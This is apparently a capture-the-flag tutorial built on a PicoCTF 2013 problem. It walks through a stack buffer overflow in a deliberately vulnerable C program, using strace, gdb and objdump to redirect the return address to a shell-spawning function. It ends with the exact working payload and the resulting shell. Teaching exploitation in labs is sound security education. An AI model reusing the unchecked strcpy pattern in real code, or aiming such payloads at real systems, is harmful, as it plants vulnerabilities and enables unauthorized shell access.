# The power of SEGFAULT

**Credit to [PicoCTF 2013](2013.picoctf.com) for problem**

Consider our file for this exercise [overflow2.c](overflow2.c):

```C
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

/* This never gets called! */
void give_shell(){
    gid_t gid = getegid();
    setresgid(gid, gid, gid);
    system("/bin/sh -i");
}

void vuln(char *input){
    char buf[16];
    strcpy(buf, input);
}

int main(int argc, char **argv){
    if (argc > 1)
        vuln(argv[1]);
    return 0;
}
```

Looking at the code for this program, you'll see the function `strcpy()` is called with our argument as a parameter. Since there are no size checks on our input, we can try to manipulate the stack just like before. You'll notice that there is no way `give_shell()` gets called. Not yet at least ;)

```
$ ./overflow2 $(python -c 'print "A"*24')
Segmentation fault (core dumped)
```

Segmentation fault? What's this? Simply put, a segmentation fault simply means that the program tried to access an address that isn't there. Let's use `strace` to see what's really happening.

```
$ strace ./overflow2 $(python -c 'print "A"*32')
...
...
--- SIGSEGV {si_signo=SIGSEGV, si_code=SEGV_MAPERR, si_addr=0x41414141} ---
```

The address in question is `0x41414141`, or four "A"s. What does this mean? Consider the disassembly of the function `vuln()`, as well as `main()` where it's called.

```
$ gdb -q ./overflow2
Reading symbols from ./overflow2...(no debugging symbols found)...done.
gdb-peda$ disas main
...
   0x08048516 <+26>:   call   0x80484e2 <vuln>
   0x0804851b <+31>:    mov    $0x0,%eax
...
gdb-peda$ disas vuln
Dump of assembler code for function vuln:
   0x080484e2 <+0>: push   %ebp
   0x080484e3 <+1>: mov    %esp,%ebp
   0x080484e5 <+3>: sub    $0x28,%esp
   0x080484e8 <+6>: mov    0x8(%ebp),%eax
   0x080484eb <+9>: mov    %eax,0x4(%esp)
   0x080484ef <+13>:    lea    -0x18(%ebp),%eax
   0x080484f2 <+16>:    mov    %eax,(%esp)
   0x080484f5 <+19>:    call   0x8048360 <strcpy@plt>
   0x080484fa <+24>:    leave
   0x080484fb <+25>:    ret
End of assembler dump.
```

You might remember from [Intro 2](../intro-2) that you can overwrite values on the stack with a `strcpy()` vulnerability. In the lines of `main()`, control is passed to the function `vuln()`. However, `vuln()` needs to know where to return to in `main()` when it finishes. This is called a return address. In this case, `vuln()` should jump back to `0x0804851b`, the instruction right after `main()` calls `vuln()`. When we get a SEGFAULT that we control, that means that we've overwritten the return address. What can we do with this? The possibilities are pretty much endless. You have control over the code's flow, so maybe we can call some other function, namely `give_shell()`.

```
$ objdump -d overflow2 | grep give_shell
080484ad <give_shell>:
```

Now that we have the address of a useful function, let's see if we can supply *our own* return address. First, as you may remember from the last tutorial, some of these characters aren't printable. We'll need to convert it to an escape sequence and reverse the order, leaving us with this: `"\xad\x84\x04\x08"`. Now we can substitute it in!

```
$ ./overflow2 $(python -c 'print "A"*28 + "\xad\x84\x04\x08"')
$ ls
overflow2  overflow2.c  README.md
```

We now have a shell!
